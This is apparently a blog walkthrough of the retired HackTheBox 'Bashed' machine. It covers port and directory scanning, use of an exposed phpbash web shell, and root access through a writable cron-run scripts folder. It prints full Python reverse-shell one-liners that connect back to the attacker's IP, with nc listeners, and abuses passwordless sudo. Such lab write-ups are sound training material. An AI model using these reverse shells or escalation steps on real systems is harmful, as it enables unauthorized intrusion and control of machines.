---
title: HTB: Bashed
url: https://0xdf.gitlab.io/2018/04/29/htb-bashed.html
date: 2018-04-29T01:25:59+00:00
difficulty: Easy [20]
os: Linux
tags: ctf, hackthebox, htb-bashed, php, sudo, cron, oscp-like-v1
---

Bashed retired from hackthebox.eu today. Here’s my notes transformed into a walkthrough. These notes are from a couple months ago, and they are a bit raw, but posting here anyway.

## Box Info

| Name | [Bashed](https://hackthebox.com/machines/bashed)  [Bashed](https://hackthebox.com/machines/bashed) [Play on HackTheBox](https://hackthebox.com/machines/bashed) |
| --- | --- |
| Release Date | 09 Dec 2017 |
| Retire Date | 04 May 2024 |
| OS | Linux Linux |
| Base Points | Easy [20] |
| Rated Difficulty | Rated difficulty for Bashed |
| Radar Graph | Radar chart for Bashed |
| First Blood User | 00:03:16[paciock paciock](https://app.hackthebox.com/users/9825) |
| First Blood Root | 00:22:18[zc00l zc00l](https://app.hackthebox.com/users/3564) |
| Creator | [Arrexel Arrexel](https://app.hackthebox.com/users/2904) |

## User

An initial nmap scan showed only port 80:

```

root@kali# nmap -sV -sC -oA nmap/initial 10.10.10.68
Starting Nmap 7.60 ( https://nmap.org ) at 2018-03-06 20:40 EST
Nmap scan report for 10.10.10.68
Host is up (0.098s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http?

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.85 seconds

```

The page is a blog with one post about phpbash:
![](https://0xdfimages.gitlab.io/img/phpbash.png)
![](https://0xdfimages.gitlab.io/img/main.png)

So let’s fire up gobuster and see what the site looks like:

```

root@kali# gobuster -u http://10.10.10.68 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt

Gobuster v1.4.1              OJ Reeves (@TheColonial)
=====================================================
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.68/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Status codes : 200,204,301,302,307
=====================================================
/images (Status: 301)
/uploads (Status: 301)
/php (Status: 301)
/css (Status: 301)
/dev (Status: 301)
/js (Status: 301)
/fonts (Status: 301)

```

`/dev` is interesting. and allows dirwalks:

![](https://0xdfimages.gitlab.io/img/index_of_dev.png)

Clicking on phpbash gives a shell:

![](https://0xdfimages.gitlab.io/img/phpbash_shell.png)

Inside /home/arrexel is the user flag:

```

www-data@bashed:/home/arrexel# ls
user.txt
www-data@bashed:/home/arrexel# wc -c user.txt
33 user.txt

```

## Shell upgrade

In phpbash, run:

```

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.157",1235));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

```

Local Kali:

```

root@kali# nc -lnvp 1235
listening on [any] 1235 ...
connect to [10.10.14.157] from (UNKNOWN) [10.10.10.68] 49932
/bin/sh: 0: can't access tty; job control turned off
$ python -c 'import pty; pty.spawn("/bin/bash")'
www-data@bashed:/var/www/html/dev$

```

## root

Start with LinEnum.sh to get info about privesc. This section stands out:

```

www-data can sudo as scriptmanager:
We can sudo without supplying a password!
Matching Defaults entries for www-data on bashed:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bashed:
    (scriptmanager : scriptmanager) NOPASSWD: ALL

```

Easy to get a shell as scriptmanager: `sudo -u scriptmanager /bin/bash`

Now scriptmanager has access to a folder that www-data could not access:

```

$ ls -ld /scripts
drwxrwxr-- 2 scriptmanager scriptmanager 4096 Dec  4 18:06 /scripts

```

Inside that directory, there are two files:

```

scriptmanager@bashed:/scripts$ ls -l
total 8
-rw-r--r-- 1 scriptmanager scriptmanager 58 Dec  4 17:03 test.py
-rw-r--r-- 1 root          root          12 Mar  7 04:09 test.txt

scriptmanager@bashed:/scripts$ cat test.py
f = open("test.txt", "w")
f.write("testing 123!")
f.close

scriptmanager@bashed:/scripts$ cat test.txt
testing 123!

```

Most interesting is that the test.txt file is owned by root, and seems to be the result of the test.py script, which is writable by scriptmanager.

First, I tried moving test.txt to test.txt.old. A few minutes later, it’s back:

```

scriptmanager@bashed:/scripts$ date
Wed Mar  7 05:37:32 PST 2018

scriptmanager@bashed:/scripts$ ls
test.py  test.txt.old  test2.py  test3.py  testt.py

scriptmanager@bashed:/scripts$ date
Wed Mar  7 05:39:14 PST 2018

scriptmanager@bashed:/scripts$ ls
test.py  test.txt  test.txt.old  test2.py  test3.py  testt.py

```

Something is running that test.py script from the /scripts directory.

Create a test script that writes to a different file, and it writes the different file. So any .py file seems to be run. Also, since test.py doesn’t have a #! at the start, it seems that whatever is running this (maybe a cron?) is calling python.

It is possible to just write a script that reads /root/root.txt and writes it elsewhere, but it’s better to get a shell! Create the exploit:

```

scriptmanager@bashed:/scripts$ echo "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.157\",31337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);" > .exploit.py

```

On Kali, set up a listener, and get root shell:

```

root@kali# nc -lnvp 31337
listening on [any] 31337 ...
connect to [10.10.14.157] from (UNKNOWN) [10.10.10.68] 47806
/bin/sh: 0: can't access tty; job control turned off

# id
uid=0(root) gid=0(root) groups=0(root)

# python -c 'import pty; pty.spawn("/bin/bash")'

root@bashed:/scripts# crontab -l
* * * * * cd /scripts; for f in *.py; do python "$f"; done

root@bashed:/scripts# wc -l /root/root.txt
33 /root/root.txt

```

As expected, there’s a cron that’s running scripts from the /scripts directory as root.